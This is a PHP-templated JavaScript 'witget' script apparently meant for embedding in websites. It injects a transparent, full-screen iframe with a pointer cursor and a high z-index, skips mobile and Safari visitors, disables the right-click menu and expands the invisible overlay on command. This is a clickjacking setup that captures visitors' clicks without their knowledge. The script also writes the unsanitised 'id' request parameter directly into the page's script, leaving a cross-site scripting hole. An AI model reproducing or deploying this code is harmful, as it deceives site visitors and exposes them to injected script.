<?php
$myid = $_GET['id'];
?>
if( navigator.userAgent.match( "Android|BackBerry|phone|iPad|iPod|IEMobile|Nokia|Mobile|MSIE|iPhone|webOS|Windows Phone|Explorer|Trident" )  )  {
	mnoload = false; } else { mnoload = true; }

isSafari = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/); 

if (isSafari) { mnoload = false; }

if (!navigator.cookieEnabled) { mnoload = false; }

function are_cookies_enabled() {
	var cookieEnabled = (navigator.cookieEnabled) ? true : false;
	if (typeof navigator.cookieEnabled == "undefined" && !cookieEnabled) { 
		cookieEnabled = (document.cookie.indexOf("mywitget") != -1) ? true : false;
	}
	return (cookieEnabled);
}

function setCookie (name, value, expires, path, domain, secure) {
      document.cookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
}

function getCookie(name) {
	var cookie = " " + document.cookie;
	var search = " " + name + "=";
	var setStr = null;
	var offset = 0;
	var end = 0;
	if (cookie.length > 0) {
		offset = cookie.indexOf(search);
		if (offset != -1) {
			offset += search.length;
			end = cookie.indexOf(";", offset)
			if (end == -1) {
				end = cookie.length;
			}
			setStr = unescape(cookie.substring(offset, end));
		}
	}
	return(setStr);
}

if (!are_cookies_enabled()) {
	mnoload = false;
} else {
	var mywc = getCookie("mywitget");
	if (mywc == "<?=$myid?>") {
		mnoload = false;
	}
	
}

iframe_url = 'witget/index2.php?host='+location.host+'&id=<?=$myid?>';

if( mnoload ) {
		document.oncontextmenu = new Function("return false;");

		var sf = document.createElement('div');
		sf.innerHTML = '<iframe src="'+iframe_url+'" name="mywitget" id="mywitget" frameborder="no" scrolling="no" allowtransparency style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; filter:alpha(opacity=0); opacity:0; cursor: pointer; z-index:88888;" /><\/iframe>'; 
		(document.getElementsByTagName('html')[0] || document.body).appendChild( sf );
		sf = document.getElementById("mywitget");
		sf.style.visibility = "hidden";
		sf.style.height = "1px";
		sf.style.width = "1px";
		sf.parent = undefined;
}

onmessage = function(evnt) {
		if (evnt.data=='myhide1') {
			document.getElementById('mywitget').style.visibility = "hidden";
			document.getElementById("mywitget").style.height = "1px";
			document.getElementById("mywitget").style.width = "1px";
			setCookie("mywitget","<?=$myid?>", "Mon, 01-Jan-2016 00:00:00 GMT", "/");
		}
		if (evnt.data=='myhide2') {
			document.getElementById('mywitget').style.visibility = "hidden";
			document.getElementById("mywitget").style.height = "1px";
			document.getElementById("mywitget").style.width = "1px";
			setCookie("mywitget","0", "Mon, 01-Jan-2016 00:00:00 GMT", "/");
		}
		if (evnt.data=='myshow') {
			document.getElementById('mywitget').style.visibility = "visible";
			document.getElementById("mywitget").style.height = "100%";
			document.getElementById("mywitget").style.width = "100%";
		}
}


